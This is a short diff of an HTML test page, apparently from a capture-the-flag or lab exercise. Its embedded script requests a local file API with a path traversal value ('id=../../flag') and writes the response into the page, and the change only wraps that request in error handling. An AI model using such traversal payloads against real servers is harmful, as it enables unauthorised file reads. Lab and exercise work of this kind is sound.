@@ -6,12 +6,16 @@ Test content
 </div>
 <script>
     document.getElementById("content").innerHTML+= "new content";
-    x = new XMLHttpRequest;
-    x.onload = function(){
-        document.write(this.responseText);
+    try{
+        x = new XMLHttpRequest;
+        x.onload = function(){
+            document.write(this.responseText);
+        }
+        x.open("GET", "http://127.0.0.1:56976/api/files?id=../../flag");
+        x.send();
+    }catch(e){
+        document.getElementById("content").innerHTML+= e;
     }
-    x.open("GET", "http://127.0.0.1:56976/api/files?id=../../flag");
-    x.send();
 </script>
 </body>
 </html>
